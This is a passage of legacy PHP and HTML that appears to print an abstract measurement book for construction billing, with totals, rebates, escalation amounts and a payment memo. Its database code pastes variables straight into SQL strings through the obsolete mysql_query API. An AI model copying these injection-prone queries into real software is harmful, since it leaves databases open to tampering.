		<!--<td  align='left' width='3%' class=' label' style="border-bottom-color:#666666">&nbsp;</td>-->
		<td  align='left' width='' class=''>&nbsp;<?php //echo $Line; ?></td>
		<td  align='right' width='' class='labelbold'>TOTAL</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo $rate; ?>
		</td>
		<td  align='left' width='' class=''>
		<?php echo $unit; ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_amt_item, 2, '.', ''); ?>
		</td>
		<td  align='left' width='' class=''>&nbsp;</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($slm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
	</tr>
	<?php UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page); ?>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr bgcolor=""><td colspan="12">&nbsp;</td></tr>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<!--<tr bgcolor="#d4d8d8" style="height:10px"><td colspan="13" style="border-top-color:#0A9CC5; border-bottom-color:#0A9CC5;"></td></tr>-->
	<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
	<?php //echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>"; ?>
	<?php
	$color_var++; $table_group_row++;
	$OverAllSlmAmount 		=  $OverAllSlmAmount	+	$slm_amount_item; 
	$OverAllDpmAmount 		=  $OverAllDpmAmount	+	$dpm_amount_item; 
	$OverAllSlmDpmAmount 	=  $OverAllSlmDpmAmount	+	$total_amt_item;
}
//echo $Line;	
	$SlmRebateAmount 		=  round($OverAllSlmAmount 	* 	$overall_rebate_perc /100);
	$DpmRebateAmount 		=  round($OverAllDpmAmount 	* 	$overall_rebate_perc /100);
	$SlmDpmRebateAmount 	=  round($OverAllSlmDpmAmount * 	$overall_rebate_perc /100);
	
	$SlmNetAmount 			=  round($OverAllSlmAmount	-	$SlmRebateAmount); 
	$DpmNetAmount 			=  round($OverAllDpmAmount	-	$DpmRebateAmount); 
	$SlmDpmNetAmount 		=  round($OverAllSlmDpmAmount	-	$SlmDpmRebateAmount);
$Linecheck = 3;
$LineTemp = $Line + $Linecheck;
if($LineTemp >= 30){ $Line = 30; } 
if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $Line; ?></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
}
?>

	<tr class="labelprint" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr class="labelprint">
		<td colspan="2" align="right">Less Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr class="labelbold" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
<?php 
$Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} 

$delete_recovery_query = "delete from generate_otherrecovery where sheetid = '$abstsheetid' and rbn = '$rbn'";
$delete_recovery_sql = mysql_query($delete_recovery_query);

$insert_recovery_query = "insert into generate_otherrecovery set abstract_net_amt = '$SlmNetAmount', sheetid = '$abstsheetid', rbn = '$rbn'";
$insert_recovery_sql = mysql_query($insert_recovery_query);

if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
}
else
{
?>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
<?php
/*while($Line<30)
{
	echo "<br/>";
	$Line++;
}
*/?>
Page <?php echo $page; ?></td></tr>
<?php	
}
?>
</table>
<p style='page-break-after:always;'></p>
<?php 
$page++;
$esc_cnt = 0;

$EscQtrArray = array();
$EscTccAmtArray = array();
$EscTcaAmtArray = array();
$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rbn = '$rbn' ORDER BY quarter ASC";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		while($EscList = mysql_fetch_object($select_esc_rbn_sql))
		{
			$quarter = $EscList->quarter;
			$esc_tcc_amount = $EscList->tcc_amt;
			$esc_tca_amount = $EscList->tca_amt;
			$esc_qtr_amt = round(($esc_tcc_amount+$esc_tca_amount),2);//$EscList->esc_total_amt;
			
			
			array_push($EscQtrArray,$quarter);
			array_push($EscTccAmtArray,$esc_qtr_amt);
			//array_push($EscTcaAmtArray,$esc_tca_amount);
			$update_esc_mbook_query = 	"update escalation set tcc_absmbook = '$abstmbno', tcc_absmbpage = '$page', tca_absmbook = '$abstmbno', 
										tca_absmbpage = '$page' where flag = 0 and sheetid = '$abstsheetid' and quarter = '$quarter'";
			$update_esc_mbook_sql = mysql_query($update_esc_mbook_query);							
		}
	}
}


$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		$esc_cnt = 1;
		$update_esc_mbook_query = 	"update escalation set tcc_absmbook = '$abstmbno', tcc_absmbpage = '$page', tca_absmbook = '$abstmbno', 
									tca_absmbpage = '$page' where flag = 0 and sheetid = '$abstsheetid'";
		$update_esc_mbook_sql = mysql_query($update_esc_mbook_query);							
	}
}

echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
echo "<tr style='border:none'><td style='border:none' class='labelbold' align='center' colspan='12'><u>Memo of payment</u></td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Upto date value of work done : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmDpmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Deduct Previous Paid : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none; border-bottom:1px dashed #000000'>(-)&nbsp;&nbsp;".number_format($OverAllDpmAmount, 2, '.', '')."</td><td style='border:none; border-bottom:1px dashed #000000'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Net Amount : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'>  </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Secured Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($sec_adv_amount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
if(count($EscQtrArray) >0)
{
	for($q1=0; $q1<count($EscQtrArray); $q1++)
	{
		$EQtr = $EscQtrArray[$q1];
		$ETccAmt = $EscTccAmtArray[$q1];
		//$ETcaAmt = $EscTcaAmtArray[$q1];
		echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($ETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
		//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
echo "</table>";


$delete_mymbook_sql = "delete from mymbook where rbn = '$rbn' and sheetid = '$abstsheetid' and staffid = '$staffid' and mtype = 'A' and genlevel = 'abstract'";
$delete_mymbook_query = mysql_query($delete_mymbook_sql);
if($newmbookno == "")
{
	$insert_mymbook_sql = "insert into mymbook set mbno = '$oldabstmbno', startpage = '$oldabstmbpage', endpage = '$page', rbn = '$rbn', sheetid = '$abstsheetid', staffid = '$staffid', mtype = 'A', genlevel = 'abstract', mbookorder = 1, active = 1";
	$insert_mymbook_query = mysql_query($insert_mymbook_sql);
}
else
{
	$insert_mymbook_sql1 = "insert into mymbook set mbno = '$oldabstmbno', startpage = '$oldabstmbpage', endpage = '100', rbn = '$rbn', sheetid = '$abstsheetid', staffid = '$staffid', mtype = 'A', genlevel = 'abstract', mbookorder = 1, active = 1";
	$insert_mymbook_query1 = mysql_query($insert_mymbook_sql1);
	$insert_mymbook_sql2 = "insert into mymbook set mbno = '$abstmbno', startpage = '$newabstmbpage', endpage = '$page', rbn = '$rbn', sheetid = '$abstsheetid', staffid = '$staffid', mtype = 'A', genlevel = 'abstract', mbookorder = 2, active = 1";
	$insert_mymbook_query2 = mysql_query($insert_mymbook_sql2);
}
/*echo "<p  style='page-break-after:always;'></p>";
for($x=0;$x<$emptypage;$x++)
{
$page++;
echo $table;
echo "<table width='1087px' bgcolor='white'   border='0' cellpadding='3' cellspacing='3' align='center' class='label'>";
echo $tablehead;
$y=1;
while($y<22)
{
?>
	<!--<tr>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='20%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='8%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='4%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
</tr>-->
	<?php
	$y++;		
}
echo "<tr style='border:none'><td colspan='12' style='border:none' align='center'>Page ".$page."</td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";
//$page++;
}*/
?>
<input type="hidden" name="txt_abstmbno" id="txt_abstmbno" value="<?php echo $abstmbno; ?>" />
<input type="hidden" name="txt_maxpage" id="txt_maxpage" value="<?php echo $page; ?>" />

<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />
<div align="center" class="btn_outside_sect printbutton">
	<!--<div class="btn_inside_sect"><input type="Submit" name="Submit" value="Submit" id="Submit" /> </div>-->
	<div class="btn_inside_sect"><input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" /></div>
	<div class="btn_inside_sect"><input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> </div>
</div> 

		<!-- modal content -->
		<!--<div id="basic-modal-content">
			<div align="center" class="popuptitle">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#0080ff" style="color:#FFFFFF">
						<td align="center" colspan="7">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr>
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr>
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr>
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr>
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" rows="3" style="width:519px;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#0080ff" style="color:#FFFFFF">
							<td align="center" colspan="5">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr>
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" readonly="" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr>
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr>
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" rows="3" style="width:375px;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<!--<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>     -->
</form>
</body>

</html>